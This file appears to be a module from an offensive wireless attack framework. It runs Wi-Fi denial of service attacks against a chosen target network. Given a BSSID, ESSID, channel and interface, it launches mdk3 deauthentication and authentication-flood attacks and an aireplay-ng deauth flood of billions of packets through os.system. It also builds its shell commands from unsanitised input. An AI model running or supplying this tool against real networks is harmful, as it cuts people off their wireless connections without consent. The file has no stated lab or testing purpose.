import time,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "wifi_dos",
        "title"       : "Wifi dos",
        "module"      : "wireless/wifi/attack wifi dos network  network_manager",
        "description" : "create traffic jams for the radio transmitter so that real traffic cannot get through"
}

options ={
  "INTERFACE" : [str(var.all_var['interface']),'enter the interface [wlan0/wlan0mon]'],
  "BSSID"     : [str(var.all_var['bssid']),'enter the bssid of the target'],
  "essid"     : [str(var.all_var['essid']),'enter the essid of the target'],
  "CHANNEL"   : [str(var.all_var['channel']),'enter the channel of the network']

}

def running():
        try:
                print ("")
                print (blue+"[*]"+default+ "Starting a Attack Has Been Started on {}".format(var.all_var['essid']))
                time.sleep(2)
                print ("")
                time.sleep(2)
                print ("") 
                time.sleep(1)
                os.system("mkdir /Temp")
                os.chdir("/Temp")
                os.system("xterm -e rm -rf blacklist")
                openf = ("echo {} >>blacklist".format(var.all_var['bssid']))
                os.system(openf)
                print (blue+"[*]"+default+"BlackList File .... Created.")
                time.sleep(1)
                print (blue+ "[*]"+default+"Deauthentication - Dissasocition Attack .... Started.")
                time.sleep(1)
                print (blue+ "[*]"+default+"Authentication DOS Attack .... Started." )
                time.sleep(1)
                order = ("xterm -e mdk3 {} d -b blacklist -c {} & xterm -e mdk3 {} a -m -i {} & xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a {} -e {} {} ".format(var.all_var['interface'],var.all_var['channel'],var.all_var['interface'],var.all_var['bssid'],var.all_var['bssid'],var.all_var['essid'],var.all_var['interface']))
                os.system(order)
                time.sleep(5)
                print (green_underline +"[+]"+default+"Wifi Jamming Attack Has Ben Started ...")
                time.sleep(1)
                print (green_underline +"[+]"+default+"WIFI DOS Attack Has Been Started ..." )
                print ("")
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))

